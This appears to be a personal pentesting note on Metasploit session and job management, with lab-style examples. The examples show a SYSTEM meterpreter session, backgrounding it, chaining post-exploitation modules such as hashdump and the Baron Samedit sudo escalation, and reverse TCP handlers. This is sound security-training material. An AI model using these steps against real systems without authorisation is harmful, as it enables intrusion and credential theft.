---
id: Sessions
aliases: []
tags:
  - Pentest/Tools/Metasploit/Sessions
---

# Sessions

MSFconsole can manage multiple modules at the same time using sessions

___

<!-- Usage {{{-->
## Usage

Sessions Help

```sh
sessions -h
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 > sessions -h
> ```
>
> ```sh
> Usage: sessions [options] or sessions [id]
>
> Active session manipulation and interaction.
>
> OPTIONS:
>
>     -c, --command <command>              Run a command on the session given with -i, or all
>     -C, --meterpreter-command <command>  Run a Meterpreter Command on the session given with -i, or all
>     -d, --list-inactive                  List all inactive sessions
>     -h, --help                           Help banner
>     -i, --interact <id>                  Interact with the supplied session ID
>     -k, --kill <id>                      Terminate sessions by session ID and/or range
>     -K, --kill-all                       Terminate all sessions
>     -l, --list                           List all active sessions
>     -n, --name <id> <name>               Name or rename a session by ID
>     -q, --quiet                          Quiet mode
>     -s, --script <script>                Run a script or module on the session given with -i, or all
>     -S, --search <filter>                Row search filter. (ex: sessions --search 'last_checkin:less_than:10s session_id:5 session_type:meterpreter')
>     -t, --timeout <seconds>              Set a response timeout (default: 15)
>     -u, --upgrade <id>                   Upgrade a shell to a meterpreter session on many platforms
>     -v, --list-verbose                   List all active sessions in verbose mode
>     -x, --list-extended                  Show extended information in the session table
> ```
> ___
<!-- }}} -->

List Sessions

```sh
sessions
```

```sh
sessions -l
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 exploit(windows/smb/psexec_psh) > sessions
> ```
>
> ```sh
> Active sessions
> ===============
>
>   Id  Name  Type                     Information                 Connection
>   --  ----  ----                     -----------                 ----------
>   1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
> ```
>
> ___
<!-- }}} -->

Open Session

```sh
sessions -i <id>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
> ```
> ```sh
> [*] Starting interaction with 1...
>
> meterpreter >
> ```
<!-- }}} -->

Background Session
(`[Ctrl]` + `Z`)

```sh
bg
```

```sh
background
```

### Run Additional Module

Run an additional module on an exploited system

1. Background the current session

```sh
background
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> meterpreter > background
> ```
>
> ```sh
> [*] Backgrounding session 1...
> ```
<!-- }}} -->

2. Search and select the second module
   (*usually found in the `post` category*)

```sh
search <module> [type:<type>] [name:<name>]
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > search post windows hashdump
> ```
> ```sh
> msf > search sudo baron samedit
> ```
<!-- }}} -->

3. Set options

```sh
show options
```

4. Set `LHOST` and a different `LPORT` to avoid overlapping

```sh
set LHOST <ip>
```

```sh
set LPORT <port>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf exploit(linux/local/sudo_baron_samedit) > set LHOST tun0
> ```
> ```sh
> LHOST => 10.10.14.10
> ```
> ```sh
> msf exploit(linux/local/sudo_baron_samedit) > set LPORT 9001
> ```
> ```sh
> LPORT => 9001
> ```
<!-- }}} -->

5. List sessions

```sh
sessions -l
```

6. Select the session to tie the exploit to

```sh
set SESSION <id>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf exploit(linux/local/sudo_baron_samedit) > set SESSION 1
> ```
>
> ```sh
> SESSION => 1
> ```
<!-- }}} -->

7. Run the exploit

```sh
run
```

```sh
exploit
```

___
<!-- }}} -->

<!-- Jobs {{{-->
## Jobs

Jobs Help

```sh
jobs -h
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 exploit(multi/handler) > jobs -h
> ```
> ```sh
> Usage: jobs [options]
>
> Active job manipulation and interaction.
>
> OPTIONS:
>
>     -K        Terminate all running jobs.
>     -P        Persist all running jobs on restart.
>     -S <opt>  Row search filter.
>     -h        Help banner.
>     -i <opt>  Lists detailed information about a running job.
>     -k <opt>  Terminate jobs by job ID and/or range.
>     -l        List all running jobs.
>     -p <opt>  Add persistence to job by job ID
>     -v        Print more detailed info.  Use with -i and -l
> ```
<!-- }}} -->

List Jobs

```sh
jobs -l
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 exploit(multi/handler) > jobs -l
> ```
>
> ```sh
> Jobs
> ====
>
>  Id  Name                    Payload                    Payload opts
>  --  ----                    -------                    ------------
>  0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
> ```
<!-- }}} -->

Terminate Job

```sh
jobs -k <id>
```

Terminate all Jobs

```sh
jobs -K
```

Run Exploit as Background Job

```sh
exploit -j
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf6 exploit(multi/handler) > exploit -j
> ```
> ```sh
> [*] Exploit running as background job 0.
> [*] Exploit completed, but no session was created.
>
> [*] Started reverse TCP handler on 10.10.14.34:4444
> ```
<!-- }}} -->

___
<!-- }}} -->
